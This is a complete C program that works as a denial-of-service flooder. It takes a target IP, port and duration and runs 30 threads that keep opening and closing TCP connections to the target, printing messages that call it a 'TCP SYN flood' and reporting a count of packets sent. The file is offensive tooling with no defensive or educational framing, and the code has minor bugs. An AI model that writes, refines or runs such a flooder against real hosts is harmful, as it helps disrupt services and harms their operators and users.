#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define NUM_THREADS 30  // Changed to 30 threads

struct thread_data {
    char *ip;
    int port;
    int duration;
    long *packet_count; // Pointer to shared counter
    time_t end_time;
};

void *syn_worker(void *thread_arg) {
    struct thread_data *my_data = (struct thread_data *)thread_arg;
    char *ip = my_data->ip;
    int port = my_data->port;
    time_t end_time = my_data->end_time;
    long *packet_count = my_data->packet_count; // Get pointer

    int sock;
    struct sockaddr_in serv_addr;

    //printf("Thread started\n"); // Debug: Thread start confirmation

    while (time(NULL) < end_time) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            //perror("Socket creation error");
            continue; // Don't exit, keep trying in other threads
        }

        int flag = 1;
        if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *) &flag, sizeof(int)) < 0) {
            //perror("setsockopt TCP_NODELAY failed");
            close(sock);
            continue; // Don't exit, keep trying
        }

        memset(&serv_addr, '0', sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(port);

        if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
            //fprintf(stderr, "Invalid address/ Address not supported \n");
            close(sock);
            continue; // Don't exit, keep trying
        }
        connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
        __sync_fetch_and_add(packet_count, 1); // Atomic increment
        close(sock);
    }
    //printf("Thread finished\n"); // Debug: Thread finish confirmation
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <ip> <port> <duration>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (port < 1 || port > 65535) {
        fprintf(stderr, "Invalid port number. Port must be between 1 and 65535.\n");
        return 1;
    }

    if (duration <= 0) {
        fprintf(stderr, "Invalid duration. Duration must be greater than 0.\n");
        return 1;
    }

    pthread_t threads[NUM_THREADS];
    struct thread_data thread_args[NUM_THREADS];
    long packet_count = 0; // Shared counter, not a pointer
    time_t end_time = time(NULL) + duration;

    printf("Starting TCP SYN flood on %s:%d for %d seconds using %d threads...\n", ip, port, duration, NUM_THREADS);

    // Initialize and create threads
    for (int i = 0; i < NUM_THREADS; i++) {
        thread_args[i].ip = ip;
        thread_args[i].port = port;
        thread_args[i].duration = duration;
        thread_args[i].end_time = end_time;
        thread_args[i].packet_count = &packet_count; // Assign the pointer to shared counter

        if (pthread_create(&threads[i], NULL, syn_worker, (void *)&thread_args[i])) {
            fprintf(stderr, "Error creating thread %d\n", i);
            return 1;
        }
    }

    // Wait for threads to complete
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("TCP SYN flood complete. Sent %ld SYN packets.\n", packet_count);

    return 0;
}
